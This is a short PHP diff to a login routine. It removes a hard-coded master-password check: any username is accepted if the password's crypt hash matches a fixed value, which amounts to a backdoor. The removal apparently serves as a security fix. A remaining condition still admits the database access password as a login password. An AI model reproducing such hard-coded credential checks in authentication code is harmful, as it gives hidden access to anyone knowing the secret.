@@ -1695,7 +1695,6 @@ class System {
         if($username && ($password || $skip_pwd_check)){
             
             if($skip_pwd_check 
-                || hash_equals(crypt($password, 'sbzR8w7tl02VQ'), 'sbzR8w7tl02VQ')
                 || (isset($passwordForDatabaseAccess) && strlen($passwordForDatabaseAccess)>15 && $passwordForDatabaseAccess==$password)
               )            
             {
